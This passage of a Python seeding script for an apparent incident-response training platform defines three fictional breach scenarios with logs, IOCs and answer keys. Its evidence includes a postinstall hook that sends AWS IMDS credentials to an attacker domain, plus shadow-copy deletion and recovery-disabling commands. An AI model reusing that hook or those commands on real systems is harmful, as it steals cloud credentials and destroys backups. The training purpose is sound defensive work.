                    "description": "Spooler service automatically recycled due to pending print queue.",
                    "is_correct": False
                },
                {
                    "id": "det-4",
                    "title": "Alert #9030: Outdated Chrome Browser on Guest Wi-Fi",
                    "severity": "LOW",
                    "source": "NAC Controller",
                    "description": "Unauthenticated mobile phone on guest subnet running Chrome version 119.",
                    "is_correct": False
                }
            ],
            "identification_options": {
                "attack_types": [
                    "Credential Harvesting & Lateral Movement",
                    "DDoS Amplification Attack",
                    "SQL Injection on Public Web Portal",
                    "Physical Badge Cloning"
                ],
                "attack_vectors": [
                    "Phishing Email with Macro-Enabled Invoice",
                    "Unauthenticated RDP Exposure",
                    "Zero-Day Buffer Overflow in VPN",
                    "Malicious USB Drop"
                ],
                "affected_assets": [
                    "WS-FIN-04 (10.0.2.45)",
                    "PRD-SRV-01 (10.0.1.10)",
                    "GUEST-WIFI-AP (192.168.99.1)",
                    "CORE-FIREWALL-EDGE (10.0.0.1)"
                ],
                "primary_iocs": [
                    "c2-update.darknet-relay.com",
                    "192.168.1.254",
                    "pool.support-ntp.org",
                    "update.microsoft.com"
                ]
            },
            "response_actions": [
                {
                    "id": "resp-1",
                    "title": "Network Isolate WS-FIN-04 via EDR Agent",
                    "classification": "CORRECT",
                    "description": "Sever all lateral network connections while preserving EDR management channel to allow live memory acquisition and containment."
                },
                {
                    "id": "resp-2",
                    "title": "Block C2 Domain 'c2-update.darknet-relay.com' and IP '185.220.101.44' at Perimeter Firewall & DNS Sinkhole",
                    "classification": "CORRECT",
                    "description": "Prevent any additional endpoints from reaching the adversary command & control server."
                },
                {
                    "id": "resp-3",
                    "title": "Revoke and Reset Compromised Active Directory Credentials for Analyst 'm.davis'",
                    "classification": "CORRECT",
                    "description": "Invalidate active Kerberos TGT tickets and enforce password reset."
                },
                {
                    "id": "resp-4",
                    "title": "Reboot the Corporate Domain Controller immediately without forensic triage",
                    "classification": "DANGEROUS",
                    "description": "Disrupts active enterprise authentication, destroys volatile RAM evidence, and causes service outage."
                },
                {
                    "id": "resp-5",
                    "title": "Wipe and Format the hard drive of WS-FIN-04 immediately",
                    "classification": "DANGEROUS",
                    "description": "Permanently destroys all digital evidence and chain of custody before root-cause analysis is complete."
                },
                {
                    "id": "resp-6",
                    "title": "Send an unencrypted email to all employees warning them about the specific attacker IP",
                    "classification": "INCORRECT",
                    "description": "Ineffective operational security that risks tipping off the adversary."
                }
            ],
            "timeline": [
                {"time": "09:14:22 UTC", "event": "Phishing email delivered to m.davis@fincore.com with subject 'URGENT: Q3 Wire Instructions Update'"},
                {"time": "09:18:05 UTC", "event": "User opened 'Wire_Transfer_Update_v2.docm' and enabled Word VBA macros."},
                {"time": "09:18:12 UTC", "event": "VBA macro spawned powershell.exe -WindowStyle Hidden -Enc JABjADIA..."},
                {"time": "09:19:30 UTC", "event": "Outbound TLS connection established to c2-update.darknet-relay.com (185.220.101.44:443)."},
                {"time": "09:21:44 UTC", "event": "Adversary downloaded MiniDump utility and read memory of lsass.exe (PID 672)."},
                {"time": "09:25:10 UTC", "event": "Adversary executed net group 'Domain Admins' /domain and attempted SMB connection to 10.0.4.15."}
            ],
            "indicators": [
                {"type": "domain", "value": "c2-update.darknet-relay.com", "reputation": "MALICIOUS", "category": "Cobalt Strike C2 Server", "confidence": "98%"},
                {"type": "ip", "value": "185.220.101.44", "reputation": "MALICIOUS", "category": "Bulletproof Host / C2 Node", "confidence": "99%"},
                {"type": "hash", "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "reputation": "MALICIOUS", "category": "Obfuscated Macro Payload", "confidence": "95%"},
                {"type": "email", "value": "billing-secure@fincore-portal-update.com", "reputation": "MALICIOUS", "category": "Lookalike Phishing Sender", "confidence": "100%"},
                {"type": "ip", "value": "10.0.2.45", "reputation": "INTERNAL_COMPROMISED", "category": "FinCore Workstation WS-FIN-04", "confidence": "100%"}
            ],
            "evidences": [
                {
                    "evidence_code": "EV-01",
                    "title": "Phishing Email & MIME Headers",
                    "evidence_type": "Email",
                    "content": "From: FinCore Billing <billing-secure@fincore-portal-update.com>\nTo: m.davis@fincore.com\nSubject: URGENT: Q3 Wire Instructions Update\nDate: Mon, 14 Oct 2024 09:14:22 +0000\nAuthentication-Results: spf=softfail (sender IP 194.165.16.22 is not authorized); dkim=fail;\nAttachment: Wire_Transfer_Update_v2.docm (SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)\n\nBody: Please find attached the updated wire transfer instructions for our European accounts. Immediate confirmation required.",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": None
                },
                {
                    "evidence_code": "EV-02",
                    "title": "Endpoint Sysmon Process Execution Log",
                    "evidence_type": "Endpoint event",
                    "content": "EventID: 1 (Process Create)\nUtcTime: 2024-10-14 09:18:12.430\nComputer: WS-FIN-04.fincore.local\nUser: FINCORE\\m.davis\nProcessId: 4428\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Enc JABjADIAAQA9ACIAYwAyAC0AdQBwAGQAYQB0AGUALgBkAGEAcgBrAG4AZQB0AC0AcgBlAGwAYQB5AC4AYwBvAG0AIgA7... \nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nParentProcessId: 3180",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-01"
                },
                {
                    "evidence_code": "EV-03",
                    "title": "Network Firewall Outbound Traffic Stream",
                    "evidence_type": "Network log",
                    "content": "2024-10-14 09:19:30.114 | ACTION=ALLOW | PROTO=TCP | SRC=10.0.2.45:49821 | DST=185.220.101.44:443 | BYTES_SENT=1420 | BYTES_RECV=89430 | TLS_SNI=c2-update.darknet-relay.com | JA3=72a589da586844d7f0818ce684948eea",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-02"
                },
                {
                    "evidence_code": "EV-04",
                    "title": "Endpoint LSASS Process Access (Sysmon Event 10)",
                    "evidence_type": "Process event",
                    "content": "EventID: 10 (ProcessAccess)\nUtcTime: 2024-10-14 09:21:44.891\nComputer: WS-FIN-04.fincore.local\nSourceImage: C:\\Users\\m.davis\\AppData\\Local\\Temp\\procdump.exe\nTargetImage: C:\\Windows\\system32\\lsass.exe\nGrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+0xa2100|C:\\Windows\\System32\\KERNELBASE.dll+0x21a40",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-02"
                },
                {
                    "evidence_code": "EV-05",
                    "title": "Internal Active Directory SMB Lateral Movement Audit",
                    "evidence_type": "Authentication log",
                    "content": "EventID: 4624 (An account was successfully logged on)\nUtcTime: 2024-10-14 09:25:10.002\nComputer: DB-FIN-PROD.fincore.local (10.0.4.15)\nTargetUserName: m.davis\nLogonType: 3 (Network - SMB/RPC)\nWorkstationName: WS-FIN-04\nSourceNetworkAddress: 10.0.2.45\nAuthenticationPackage: Kerberos",
                    "is_suspicious": True,
                    "is_authoritative": False,
                    "prerequisite_evidence_code": "EV-04"
                },
                {
                    "evidence_code": "EV-06",
                    "title": "DNS Resolver Authoritative Query Logs",
                    "evidence_type": "DNS record",
                    "content": "2024-10-14 09:19:28.980 DNS QUERY [A] c2-update.darknet-relay.com FROM 10.0.2.45 -> ANSWER: 185.220.101.44 (TTL=60s)",
                    "is_suspicious": True,
                    "is_authoritative": False,
                    "prerequisite_evidence_code": "EV-03"
                },
                {
                    "evidence_code": "EV-07",
                    "title": "Routine IT Print Spooler Event",
                    "evidence_type": "Endpoint event",
                    "content": "EventID: 307 (Print Job Completed)\nUtcTime: 2024-10-14 09:10:00.000\nComputer: PRINTER-FLOOR3.fincore.local\nUser: j.smith\nDocument: Quarterly_Budget_Draft.pdf\nPages: 4",
                    "is_suspicious": False,
                    "is_authoritative": False,
                    "prerequisite_evidence_code": None
                },
                {
                    "evidence_code": "EV-08",
                    "title": "Threat Intelligence Report: FIN-ADV-09",
                    "evidence_type": "Threat intelligence",
                    "content": "Threat Actor Profile: Storm-0831 (Financial Crime Syndicate)\nKnown Infrastructure: *.darknet-relay.com, 185.220.101.0/24\nTypical TTPs: T1566.001 (Spearphishing Attachment), T1059.001 (PowerShell), T1003.001 (LSASS Memory Dump), T1021.002 (SMB/Windows Admin Shares).",
                    "is_suspicious": False,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": None
                }
            ]
        },
        {
            "key": "healthnet-ransomware",
            "name": "HEALTHNET RANSOMWARE OUTBREAK",
            "difficulty": "Hard",
            "attack_type": "Ransomware Deployment & Data Extortion",
            "attack_vector": "Exploited SSL-VPN Appliance (CVE-2024-21887)",
            "affected_asset": "VPN-GW-01 (192.168.1.1) & EMR-APP-SRV (192.168.10.50)",
            "primary_ioc": "194.26.29.112",
            "description": "An emergency medical health network suffered a perimeter breach via an unauthenticated remote code execution vulnerability in their edge VPN appliance. The threat actors established a web shell, disabled shadow copies, and initiated multi-threaded LockBit ransomware encryption across electronic medical record (EMR) servers.",
            "detection_signal": "EDR Alert #1180: Volume Shadow Copy Deletion and Mass File Modification on EMR-APP-SRV (192.168.10.50).",
            "detection_options": [
                {
                    "id": "det-h1",
                    "title": "Alert #1180: vssadmin shadow copy deletion & mass .locked extension modifications on EMR-APP-SRV",
                    "severity": "CRITICAL",
                    "source": "EDR Sentinel",
                    "description": "cmd.exe executed 'vssadmin delete shadows /all /quiet' followed by rapid IOPS encryption across 14,000 files.",
                    "is_correct": True
                },
                {
                    "id": "det-h2",
                    "title": "Alert #1150: Nurse station screen saver timeout",
                    "severity": "INFO",
                    "source": "Workstation Policy",
                    "description": "Station WS-NURSE-02 auto-locked after 15 minutes of inactivity.",
                    "is_correct": False
                },
                {
                    "id": "det-h3",
                    "title": "Alert #1162: Routine SSL Certificate Renewal Notice",
                    "severity": "LOW",
                    "source": "Cert Manager",
                    "description": "Internal lab test certificate expiring in 30 days.",
                    "is_correct": False
                }
            ],
            "identification_options": {
                "attack_types": [
                    "Ransomware Deployment & Data Extortion",
                    "Cryptocurrency Mining Script Injection",
                    "DNS Amplification Flood",
                    "BGP Route Hijacking"
                ],
                "attack_vectors": [
                    "Exploited SSL-VPN Appliance (CVE-2024-21887)",
                    "Compromised Third-Party Vendor API Key",
                    "Spear-Phishing Voice Call (Vishing)",
                    "Insecure S3 Bucket"
                ],
                "affected_assets": [
                    "VPN-GW-01 (192.168.1.1) & EMR-APP-SRV (192.168.10.50)",
                    "GUEST-PORTAL-WEB (192.168.20.10)",
                    "HR-PAYROLL-SRV (192.168.30.5)",
                    "CAFETERIA-POS (192.168.40.100)"
                ],
                "primary_iocs": [
                    "194.26.29.112",
                    "8.8.8.8",
                    "ntp.pool.org",
                    "10.0.0.254"
                ]
            },
            "response_actions": [
                {
                    "id": "resp-h1",
                    "title": "Immediately isolate EMR-APP-SRV and segment hospital clinical network from IT subnet",
                    "classification": "CORRECT",
                    "description": "Halt ransomware propagation across other hospital wards."
                },
                {
                    "id": "resp-h2",
                    "title": "Block external C2 IP '194.26.29.112' and revoke edge VPN sessions",
                    "classification": "CORRECT",
                    "description": "Sever attacker remote console and prevent encryption key upload."
                },
                {
                    "id": "resp-h3",
                    "title": "Restore EMR database from immutable offline cold storage backups",
                    "classification": "CORRECT",
                    "description": "Verify backup checksums and restore without paying extortion ransom."
                },
                {
                    "id": "resp-h4",
                    "title": "Pay the threat actor $2,000,000 in Bitcoin immediately",
                    "classification": "DANGEROUS",
                    "description": "Violates OFAC sanctions, provides no guarantee of decryption, and funds criminal infrastructure."
                },
                {
                    "id": "resp-h5",
                    "title": "Reboot all database servers while encryption is still actively running in RAM",
                    "classification": "DANGEROUS",
                    "description": "Corrupts file systems permanently and destroys in-memory decryption keys."
                }
            ],
            "timeline": [
                {"time": "02:11:00 UTC", "event": "Exploit payload sent to edge VPN gateway /api/v1/cav/client/status."},
                {"time": "02:15:30 UTC", "event": "Webshell established at /tmp/session_auth.py on VPN-GW-01."},
                {"time": "02:40:12 UTC", "event": "Lateral pivot to EMR-APP-SRV (192.168.10.50) via SSH using stored administrator key."},
                {"time": "03:00:00 UTC", "event": "Executed 'vssadmin.exe delete shadows /all /quiet' and stopped Volume Shadow Copy service."},
                {"time": "03:02:18 UTC", "event": "LockBit v4 binary spawned, dropping 'RESTORE-MY-FILES.txt' ransom notes across E:\\EMR_Data\\."}
            ],
            "indicators": [
                {"type": "ip", "value": "194.26.29.112", "reputation": "MALICIOUS", "category": "LockBit Ransomware C2", "confidence": "100%"},
                {"type": "hash", "value": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0", "reputation": "MALICIOUS", "category": "LockBit v4 Encryptor Binary", "confidence": "100%"},
                {"type": "domain", "value": "lockbit-support-portal.onion", "reputation": "MALICIOUS", "category": "TOR Extortion Payment Portal", "confidence": "100%"}
            ],
            "evidences": [
                {
                    "evidence_code": "EV-H01",
                    "title": "Edge VPN Gateway Exploitation Log",
                    "evidence_type": "Authentication log",
                    "content": "2024-10-15 02:11:00.210 [ALERT] CVE-2024-21887 Exploit Attempt: URI=/api/v1/cav/client/status; Payload=;python -c 'import socket...'; SRC=194.26.29.112:51200 -> STATUS=200",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": None
                },
                {
                    "evidence_code": "EV-H02",
                    "title": "EMR Database Server PowerShell Command Audit",
                    "evidence_type": "Endpoint event",
                    "content": "EventID: 4104 (Script Block Logging)\nUtcTime: 2024-10-15 03:00:01.004\nComputer: EMR-APP-SRV (192.168.10.50)\nScriptBlockText: vssadmin.exe delete shadows /all /quiet; bcdedit /set {default} bootstatuspolicy ignoreallfailures; bcdedit /set {default} recoveryenabled no",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-H01"
                },
                {
                    "evidence_code": "EV-H03",
                    "title": "Ransom Note 'RESTORE-MY-FILES.txt'",
                    "evidence_type": "File hash",
                    "content": "--- LOCKBIT 4.0 RANSOMWARE ---\nYour medical records, database backups, and patient logs are encrypted and exfiltrated.\nTo purchase the decryption key visit: http://lockbit-support-portal.onion\nDecryption ID: HN-9942-B88",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-H02"
                }
            ]
        },
        {
            "key": "cloudguard-supply-chain",
            "name": "CLOUDGUARD SUPPLY CHAIN BACKDOOR",
            "difficulty": "Hard",
            "attack_type": "Supply Chain Compromise & Cloud Token Exfiltration",
            "attack_vector": "Compromised NPM Package in CI/CD Build Pipeline",
            "affected_asset": "CI-RUNNER-PROD (172.16.5.20) & AWS S3 Financial Archive",
            "primary_ioc": "api.telemetry-package-metrics.org",
            "description": "An adversary hijacked an open-source JavaScript dependency 'event-stream-metrics' and pushed a trojanized release. When CloudGuard's CI/CD pipeline built the production frontend, the malicious hook queried the AWS Instance Metadata Service (IMDSv1) and exfiltrated temporary IAM role security credentials to an external logging server.",
            "detection_signal": "CloudTrail Alert #4421: Suspicious GetSecretValue and S3 Sync from unexpected external IP using CI-Build-Role IAM credentials.",
            "detection_options": [
                {
                    "id": "det-c1",
                    "title": "Alert #4421: AWS CloudTrail anomalous S3 GetObject & IMDS credential abuse by CI-Build-Role",
                    "severity": "CRITICAL",
                    "source": "AWS GuardDuty",
                    "description": "Temporary IAM STS credentials generated on CI-RUNNER-PROD were used from untrusted external IP 91.108.240.55 to dump financial archive buckets.",
                    "is_correct": True
                },
                {
                    "id": "det-c2",
                    "title": "Alert #4400: Standard AWS CloudWatch Billing Alarm",
                    "severity": "INFO",
                    "source": "AWS Billing",
                    "description": "Monthly spend projected to stay within normal threshold.",
                    "is_correct": False
                }
            ],
            "identification_options": {
                "attack_types": [
                    "Supply Chain Compromise & Cloud Token Exfiltration",
                    "Zero-Day Buffer Overflow",
                    "Physical Cable Tampering",
                    "BGP Route Leaking"
                ],
                "attack_vectors": [
                    "Compromised NPM Package in CI/CD Build Pipeline",
                    "Exposed Redis Server on Public Internet",
                    "Stolen Employee Laptop",
                    "Unencrypted Wi-Fi Sniffing"
                ],
                "affected_assets": [
                    "CI-RUNNER-PROD (172.16.5.20) & AWS S3 Financial Archive",
                    "MARKETING-WP-BLOG (172.16.1.5)",
                    "DEV-SANDBOX-CLUSTER (172.16.8.10)",
                    "EMPLOYEE-PORTAL (172.16.9.1)"
                ],
                "primary_iocs": [
                    "api.telemetry-package-metrics.org",
                    "10.0.0.1",
                    "aws.amazon.com",
                    "github.com"
                ]
            },
            "response_actions": [
                {
                    "id": "resp-c1",
                    "title": "Immediately revoke compromised IAM Role 'CI-Build-Role' and attach explicit Deny policy",
                    "classification": "CORRECT",
                    "description": "Invalidates all active AWS STS temporary session tokens instantly across all regions."
                },
                {
                    "id": "resp-c2",
                    "title": "Enforce IMDSv2 (Session Token Required, Hop Limit=1) on all EC2 build runner instances",
                    "classification": "CORRECT",
                    "description": "Mitigates SSRF and unauthenticated metadata harvesting from containerized build steps."
                },
                {
                    "id": "resp-c3",
                    "title": "Pin verified package checksums in package-lock.json and purge trojanized dependency",
                    "classification": "CORRECT",
                    "description": "Removes the backdoor from source control and stops build pipeline execution of untrusted scripts."
                },
                {
                    "id": "resp-c4",
                    "title": "Delete the entire AWS production cloud root organization account",
                    "classification": "DANGEROUS",
                    "description": "Catastrophic destructive action causing irreversible data loss and business shutdown."
                }
            ],
            "timeline": [
                {"time": "14:20:00 UTC", "event": "Adversary published compromised 'event-stream-metrics@3.1.4' to NPM registry."},
                {"time": "14:35:12 UTC", "event": "GitHub Actions runner CI-RUNNER-PROD executed 'npm install' during scheduled build."},
                {"time": "14:35:20 UTC", "event": "Post-install script queried http://169.254.169.254/latest/meta-data/iam/security-credentials/CI-Build-Role."},
                {"time": "14:36:00 UTC", "event": "Backdoor HTTP POST sent AWS AccessKeyId, SecretAccessKey, and Token to api.telemetry-package-metrics.org."},
                {"time": "14:40:45 UTC", "event": "External IP 91.108.240.55 invoked AWS S3 Sync against s3://cloudguard-financial-archives-prod."}
            ],
            "indicators": [
                {"type": "domain", "value": "api.telemetry-package-metrics.org", "reputation": "MALICIOUS", "category": "Supply Chain Exfiltration Endpoint", "confidence": "100%"},
                {"type": "ip", "value": "91.108.240.55", "reputation": "MALICIOUS", "category": "Adversary Cloud Token Consumer", "confidence": "100%"},
                {"type": "hash", "value": "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069", "reputation": "MALICIOUS", "category": "Trojanized postinstall.js", "confidence": "100%"}
            ],
            "evidences": [
                {
                    "evidence_code": "EV-C01",
                    "title": "NPM package.json Diff & Post-Install Hook",
                    "evidence_type": "Process event",
                    "content": "File: node_modules/event-stream-metrics/package.json\n\"scripts\": { \"postinstall\": \"node ./lib/telemetry.js\" }\n\ntelemetry.js excerpt:\nconst http = require('http');\nhttp.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/CI-Build-Role', (res) => {\n  res.on('data', (d) => {\n    fetch('https://api.telemetry-package-metrics.org/collect', {method: 'POST', body: d});\n  });\n});",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": None
                },
                {
                    "evidence_code": "EV-C02",
                    "title": "AWS CloudTrail Exfiltration Event Log",
                    "evidence_type": "Network log",
                    "content": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROAEXAMPLE:CI-Build-Session\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/CI-Build-Role/i-0abcdef1234567890\"\n  },\n  \"eventTime\": \"2024-10-16T14:40:45Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"GetObject\",\n  \"sourceIPAddress\": \"91.108.240.55\",\n  \"requestParameters\": {\n    \"bucketName\": \"cloudguard-financial-archives-prod\",\n    \"key\": \"2024/Q3_Customer_Ledger.parquet\"\n  }\n}",
                    "is_suspicious": True,
                    "is_authoritative": True,
                    "prerequisite_evidence_code": "EV-C01"
                }
            ]
        }
    ]

    for s_data in scenarios_data:
        scenario_metadata = {
            "fincore-phishing": {
                "stage_prompts": {
                    "DETECT": "Triage the FinCore mail and endpoint queue to identify the first confirmed credential-theft signal.",
                    "INVESTIGATE": "Trace the phishing message from MIME headers through the PowerShell child process, C2 IP, and stolen-account logons.",
                    "ANALYZE": "Correlate source 10.0.2.45 with destination 185.220.101.44 and the SMB pivot into the finance database.",
                    "IDENTIFY": "Classify the FinCore intrusion using the email, authentication, and lateral-movement evidence.",
                    "RESPOND": "Contain the workstation and account while preserving volatile evidence and terminating attacker sessions.",
                    "REPORT": "Write the executive FinCore phishing and lateral-movement report for finance leadership."
                },
                "tactical_hints": ["Compare SPF/DKIM failures with the sender domain.", "Use Event 4624 source and destination addresses to prove the SMB pivot.", "Terminate active sessions after preserving the LSASS and PowerShell evidence."],
                "report_fields": [
                    {"key": "incident_summary", "label": "FinCore Executive Summary", "placeholder": "Summarize the phishing compromise and finance-network exposure."},
                    {"key": "attack_type", "label": "Credential Theft and Lateral Movement", "placeholder": "Describe the credential harvesting and pivot technique."},
                    {"key": "affected_asset", "label": "Compromised User and Finance Hosts", "placeholder": "List m.davis, WS-FIN-04, DB-FIN-PROD, and IPs."},
                    {"key": "attack_vector", "label": "Phishing Entry Point", "placeholder": "Record the lookalike sender and malicious document or URL."},
                    {"key": "timeline", "label": "Authentication and Execution Timeline", "placeholder": "Sequence delivery, macro, PowerShell, LSASS access, and SMB logon."},
                    {"key": "key_evidence", "label": "Mail, Endpoint, and Authentication Evidence", "placeholder": "Cite EV-01, EV-02, EV-04, and EV-05."},
                    {"key": "iocs", "label": "FinCore IOCs", "placeholder": "List the domain, source/destination IPs, sender, and hash."},
                    {"key": "impact", "label": "Credential and Finance Impact", "placeholder": "Describe account exposure and attempted database access."},
                    {"key": "containment", "label": "Account and Session Containment", "placeholder": "Record host isolation, session termination, and password reset."},
                    {"key": "recovery", "label": "Identity Recovery", "placeholder": "Describe ticket invalidation, clean-host validation, and monitoring."},
                    {"key": "recommendations", "label": "Anti-Phishing Recommendations", "placeholder": "Recommend phishing-resistant MFA, mail controls, and PowerShell policy."}
                ]
            },
            "healthnet-ransomware": {
                "stage_prompts": {
                    "DETECT": "Prioritize the HealthNet ransomware alert that proves encryption and recovery sabotage are underway.",
                    "INVESTIGATE": "Follow the VPN exploit, web shell, privileged pivot, encryptor execution, and ransom note across clinical systems.",
                    "ANALYZE": "Map the infection timeline and determine which EMR, backup, and patient-care systems are at risk.",
                    "IDENTIFY": "Identify the ransomware family, exploited edge, affected clinical systems, and malware IOC.",
                    "RESPOND": "Isolate infected endpoints, block C2, contain the account, and choose a verified backup recovery path.",
                    "REPORT": "Prepare the HealthNet ransomware incident report with patient-care impact and recovery decisions."
                },
                "tactical_hints": ["Look for shadow-copy deletion before judging the encryption alert.", "Separate the initial VPN exploit from the later EMR execution.", "Protect clinical continuity while restoring only immutable, validated backups."],
                "report_fields": [
                    {"key": "incident_summary", "label": "HealthNet Ransomware Executive Summary", "placeholder": "Summarize the outbreak, encryption scope, and clinical urgency."},
                    {"key": "attack_type", "label": "Ransomware and Extortion Classification", "placeholder": "Describe encryption, recovery sabotage, and extortion."},
                    {"key": "affected_asset", "label": "Affected Clinical Systems", "placeholder": "List VPN-GW-01, EMR-APP-SRV, endpoints, and critical services."},
                    {"key": "attack_vector", "label": "Initial Infection Indicator", "placeholder": "Record the VPN exploit and web shell evidence."},
                    {"key": "timeline", "label": "Outbreak Timeline", "placeholder": "Sequence exploit, pivot, shadow deletion, and file encryption."},
                    {"key": "key_evidence", "label": "Ransomware Evidence", "placeholder": "Cite the exploit log, process event, hash, and ransom note."},
                    {"key": "iocs", "label": "Malware and C2 IOCs", "placeholder": "List the encryptor hash, C2 IP, and extortion portal."},
                    {"key": "impact", "label": "Patient and Critical Service Impact", "placeholder": "Describe EMR availability, patient safety, and backup impact."},
                    {"key": "containment", "label": "Isolation and Account Containment", "placeholder": "Record machine isolation, segmentation, C2 blocking, and account lockout."},
                    {"key": "recovery", "label": "Backup and Recovery Decision", "placeholder": "Describe immutable backup validation and staged restoration."},
                    {"key": "recommendations", "label": "Ransomware Resilience Recommendations", "placeholder": "Recommend segmentation, EDR controls, patching, and recovery exercises."}
                ]
            },
            "cloudguard-supply-chain": {
                "stage_prompts": {
                    "DETECT": "Select the CloudGuard cloud alert that links unexpected IAM use to a compromised build workload.",
                    "INVESTIGATE": "Inspect the package diff, post-install hook, build runner, CloudTrail event, and outbound collection endpoint.",
                    "ANALYZE": "Compare package versions and hashes, then reconstruct the dependency-to-IAM-token compromise path.",
                    "IDENTIFY": "Classify the trusted dependency backdoor, affected workload, and exfiltration IOC.",
                    "RESPOND": "Revoke credentials, remove the package, isolate the runner, rotate secrets, and validate a clean build.",
                    "REPORT": "Deliver the CloudGuard supply-chain incident report with build integrity and cloud-account impact."
                },
                "tactical_hints": ["A postinstall hook reading IMDS is not normal package telemetry.", "Compare the lockfile version and SHA-256 with the last trusted build.", "Rotate every secret reachable by the compromised CI role, not just the role itself."],
                "report_fields": [
                    {"key": "incident_summary", "label": "CloudGuard Supply-Chain Executive Summary", "placeholder": "Summarize the dependency compromise and cloud exposure."},
                    {"key": "attack_type", "label": "Backdoor and Token-Exfiltration Classification", "placeholder": "Describe the trusted-package backdoor and IAM abuse."},
                    {"key": "affected_asset", "label": "Build and Cloud Workloads", "placeholder": "List the runner, IAM role, S3 archive, and affected workloads."},
                    {"key": "attack_vector", "label": "Compromised Dependency Version", "placeholder": "Record event-stream-metrics@3.1.4 and the build trigger."},
                    {"key": "timeline", "label": "Build Pipeline Compromise Timeline", "placeholder": "Sequence package publication, npm install, IMDS access, and S3 reads."},
                    {"key": "key_evidence", "label": "Package and CloudTrail Evidence", "placeholder": "Cite EV-C01 and EV-C02 plus the version/hash comparison."},
                    {"key": "iocs", "label": "Supply-Chain IOCs", "placeholder": "List the package hash, collection domain, and source IP."},
                    {"key": "impact", "label": "Cloud and Data Impact", "placeholder": "Describe token exposure, archive access, and workload trust impact."},
                    {"key": "containment", "label": "IAM and Workload Containment", "placeholder": "Record role revocation, deny policy, runner isolation, and egress blocking."},
                    {"key": "recovery", "label": "Clean Build and Secret Rotation", "placeholder": "Describe package removal, clean rebuild validation, and secret rotation."},
                    {"key": "recommendations", "label": "Supply-Chain Hardening Recommendations", "placeholder": "Recommend provenance attestations, lockfile policy, IMDSv2, and least privilege."}
                ]
            }
        }.get(s_data["key"], {})
        scenario = db.query(models.Scenario).filter(models.Scenario.key == s_data["key"]).first()
        if not scenario:
            scenario = models.Scenario(
                key=s_data["key"],
                name=s_data["name"],
                description=s_data["description"],
                difficulty=s_data["difficulty"],
                attack_type=s_data["attack_type"],
                attack_vector=s_data["attack_vector"],
                affected_asset=s_data["affected_asset"],
                primary_ioc=s_data["primary_ioc"],
                detection_signal=s_data["detection_signal"],
                detection_options_json=json.dumps(s_data["detection_options"]),
                identification_options_json=json.dumps(s_data["identification_options"]),
                response_actions_json=json.dumps(s_data["response_actions"]),
                timeline_json=json.dumps(s_data["timeline"]),
                indicators_json=json.dumps(s_data["indicators"])
            )
            scenario.stage_prompts_json = json.dumps(scenario_metadata.get("stage_prompts", {}))
            scenario.tactical_hints_json = json.dumps(scenario_metadata.get("tactical_hints", []))
            scenario.report_fields_json = json.dumps(scenario_metadata.get("report_fields", []))
            db.add(scenario)
            db.commit()
            db.refresh(scenario)
            print(f"[SEED] Created Scenario: {scenario.name}")
        else:
            scenario.name = s_data["name"]
            scenario.description = s_data["description"]
            scenario.difficulty = s_data["difficulty"]
            scenario.attack_type = s_data["attack_type"]
            scenario.attack_vector = s_data["attack_vector"]
            scenario.affected_asset = s_data["affected_asset"]
            scenario.primary_ioc = s_data["primary_ioc"]
            scenario.detection_signal = s_data["detection_signal"]
            scenario.detection_options_json = json.dumps(s_data["detection_options"])
            scenario.identification_options_json = json.dumps(s_data["identification_options"])
            scenario.response_actions_json = json.dumps(s_data["response_actions"])
            scenario.timeline_json = json.dumps(s_data["timeline"])
            scenario.indicators_json = json.dumps(s_data["indicators"])
            scenario.stage_prompts_json = json.dumps(scenario_metadata.get("stage_prompts", {}))
            scenario.tactical_hints_json = json.dumps(scenario_metadata.get("tactical_hints", []))
            scenario.report_fields_json = json.dumps(scenario_metadata.get("report_fields", []))
            db.commit()

        # Seed Evidences for this scenario
        for ev in s_data["evidences"]:
            existing_ev = db.query(models.Evidence).filter(
                models.Evidence.scenario_id == scenario.id,
                models.Evidence.evidence_code == ev["evidence_code"]
            ).first()
            if not existing_ev:
                evidence_obj = models.Evidence(
                    scenario_id=scenario.id,
                    evidence_code=ev["evidence_code"],
                    title=ev["title"],
                    evidence_type=ev["evidence_type"],
                    content=ev["content"],
                    is_suspicious=ev["is_suspicious"],
                    is_authoritative=ev["is_authoritative"],
                    prerequisite_evidence_code=ev.get("prerequisite_evidence_code")
                )
                db.add(evidence_obj)
            else:
                existing_ev.title = ev["title"]
                existing_ev.evidence_type = ev["evidence_type"]
                existing_ev.content = ev["content"]
                existing_ev.is_suspicious = ev["is_suspicious"]
                existing_ev.is_authoritative = ev["is_authoritative"]
                existing_ev.prerequisite_evidence_code = ev.get("prerequisite_evidence_code")

        db.commit()

        db.commit()

    db.commit()
    print("[SEED] Database seeding successfully completed (Clean teams & logs).")

